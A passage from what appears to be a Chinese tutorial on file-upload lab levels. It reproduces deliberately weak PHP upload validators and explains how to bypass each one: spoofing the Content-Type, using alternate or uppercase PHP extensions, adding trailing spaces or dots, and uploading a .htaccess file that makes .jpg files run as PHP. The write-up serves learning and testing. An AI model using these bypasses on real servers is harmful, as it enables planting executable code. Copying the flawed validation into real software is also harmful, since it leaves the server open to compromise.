class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>后端php代码只对Content-Type进行了检查</p><p>绕过方法</p><p>在burp中更改Content-Type进行绕过即可</p><h1 id="黑名单校验"><a href="#黑名单校验" class="headerlink" title="黑名单校验"></a>黑名单校验</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>服务器端做了一个黑名单过滤，过滤了 <code>asp</code>、<code>aspx</code>、<code>php</code>、<code>jsp</code></p><p>绕过方法</p><p>不允许上传<code>.asp</code>,<code>.aspx</code>,<code>.php</code>,<code>.jsp</code>后缀文件，但是可以上传其他任意后缀。比如说:<code>.phtml .phps .php5 .pht</code>，但如果上传的是<code>.php5</code>这种类型文件的话，如果想要被当成<code>php</code>执行的话，需要有个前提条件，即<code>Apache的httpd.conf有如下配置代码</code>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">AddType application/x-httpd-php .php .phtml .phps .php5 .pht<br></code></pre></td></tr></table></figure><p>关于<code>AddType</code>命令的作用解释如下</p><blockquote><p><code>AddType</code> 指令<br> 作用：在给定的文件扩展名与特定的内容类型之间建立映射<br> 语法：<code>AddType MIME-type extension [extension] ...</code><br><code> AddType</code>指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br> <code>AddType</code> 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</p></blockquote><h1 id="htaccess-校验"><a href="#htaccess-校验" class="headerlink" title=".htaccess 校验"></a>.htaccess 校验</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>绕过方法</p><p>没有过滤<code>.htaccess</code>后缀，故此处也可上传<code>.htaccess</code>文件进行绕过。<br>注: <code>.htaccess</code>文件生效前提条件为</p><p>1.mod_rewrite模块开启。</p><p>2.AllowOverride All</p><blockquote><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在<code>httpd.conf</code>文件中配置。</p></blockquote><p>构造<code>.htaccess</code>文件，内容如下:<code>AddType application/x-httpd-php .jpg</code><br> 这里代码的意思可以让 <code>.jpg</code>后缀名文件格式的文件名以<code>php</code>格式解析，因此达到了可执行的效果。所以我们可以把要上传的<code>php</code>文件的后缀名改为<code>.jpg</code>格式从而绕过</p><h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>绕过方法</p><p>黑名单多了 <code>.htaccess</code>，所有不能通过 <code>.htaccsess</code> 进行绕过了。但此处代码没有将文件名统一转成小写，故可以通过大小写绕过，用burp将后缀改为大写PHP即可。</p><h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过。</p><blockquote><p>Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点<br>此处会删除末尾的点，但是这里没有去掉末尾的空格，因此上传一个 <code>.php</code> [空格]文件即可</p></blockquote><p>绕过方法</p><p>修改文件后缀为<code>1.php .</code>这种形式，从代码执行流程分析来看，会先去除文件名末尾的.,去除之后的文件后缀是 <code>.php[空格]</code>，利用<code>.php[空格]</code>绕过黑名单，然后利用windows的文件命名规则默认除去空格和.,达到上传<code>.php</code>的目的。</p><h1 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 